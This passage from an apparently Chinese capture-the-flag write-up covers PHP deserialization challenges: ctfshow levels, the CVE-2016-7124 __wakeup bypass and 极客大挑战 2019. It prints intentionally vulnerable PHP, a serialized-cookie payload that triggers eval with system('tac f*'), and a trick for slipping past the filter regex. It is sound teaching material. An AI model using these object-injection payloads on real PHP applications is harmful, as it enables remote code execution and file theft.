class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><blockquote><p>GET:username=xxxxxx&amp;password=xxxxxx Cookie:user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username!==<span class="hljs-keyword">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>GET 传入的<code>username和password</code>进入<code>login</code>，判断反序列化对象<code>user</code>后传入的<code>username和password</code>是否等于<code>login</code>传入的(即 GET 传入的）两个值，而<code>vipOneKeyGetFlag</code>要求两个值不相等</p><p>payload：</p><blockquote><p>GET:username=a&amp;password=b Cookie:O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>定位到 eval，显然需要 cat 查看 flag</p><blockquote><p>$code=”system(‘tac f*‘)”</p></blockquote><p>那么就要使用<code>getInfo</code>方法，从而需要实例化类<code>backDoor</code>而不是类<code>Info</code>，构造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> backDoor();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//序列化$a：O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:14:&quot;backDoorcode&quot;;s:17:&quot;system(&#x27;tac f*&#x27;);&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这里会提出一个问题，在上面的 PHP 序列化的格式中提到：<strong>public/protected/private 在序列化时</strong>，序列化不会保存方法，那上面的这行代码起什么作用</p><blockquote><p>$this-&gt;class=new backDoor();</p></blockquote><p>其实这里会把实例化的<code>backDoor</code>对象信息放到<code>ctfShowUser</code>类里再实例化为<code>ctfShowUser</code>的对象<code>a</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对比上题增加了正则匹配，<code>/[oc]:\d+:/i</code>匹配在引号前的字母<code>o</code>或<code>c</code>，还有引号后的数字，再一个引号</p><p>即匹配格式<code>x : num :</code></p><p>反序列化后首字母肯定是<code>o</code>，那么就在数字前加一个<code>+</code></p><p>值得注意的是，空格在 php 的 urlencode 会编码为<code>+</code>，如果此时在数字前再加入<code>+</code>，则会把 payload 中的<code>+</code>编码为<code>%2B</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211009121949046.png"></p><p>建议做法是，先通过 php 的 urlencode，然后手动插入<code>%2B</code></p><p>当然也可以不加 urlencode，然后添加<code>+</code>，然后整体编码，但是含有 private 时复制不了不可见的字符，故此做法只适合不存在 private 属性</p><h3 id="SoFun"><a href="#SoFun" class="headerlink" title="SoFun"></a>SoFun</h3><h3 id="CVE-2016-7124-wakeup-的绕过）"><a href="#CVE-2016-7124-wakeup-的绕过）" class="headerlink" title="CVE-2016-7124(__wakeup 的绕过）"></a>CVE-2016-7124(__wakeup 的绕过）</h3><p><strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行。</strong></p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>利用如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;key))&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;key == <span class="hljs-string">&#x27;flag&#x27;</span>)<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;success&#x27;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-string">&#x27;you failed 23333&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;key;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>]))&#123;<br>        show_source(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$answer</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$answer</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$answer</span>);<span class="hljs-comment">//</span><br>    &#125;<br><br><span class="hljs-comment">//__destruct已经赋值$key=flag 而__wakeup又把变量给覆盖</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:1:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125; 绕过__wakeup</span><br></code></pre></td></tr></table></figure><h4 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="极客大挑战 2019 PHP"></a>极客大挑战 2019 PHP</h4><p><a href="http://www.zip/">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Name();<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//手动修改特殊字符以及绕过__Wakeup()</span><br><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br><br><br><span class="hljs-comment">//有时是url的get传参 那么就可以使用url编码 省去修改特殊字符的操作</span><br><span class="hljs-comment">//$a = str_replace(2,3,$a);</span><br><span class="hljs-comment">//var_dump(urlencode($a));</span><br></code></pre></td></tr></table></figure><h4 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h4><p>查看图片元素得到<code>showimg.php?img=c2hpZWxkLmpwZw==</code></p><p>img 后面的猜是 base64 解码后是 shield.jpg</p><p>不断改变 base64 的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//showimg.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$f</span>)) &#123;<br><span class="hljs-variable">$f</span> = base64_decode(<span class="hljs-variable">$f</span>);<br><span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;..&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;\\&#x27;</span>)===<span class="hljs-literal">FALSE</span><br>&amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;pctf&#x27;</span>)===<span class="hljs-literal">FALSE</span>) &#123;<br>readfile(<span class="hljs-variable">$f</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 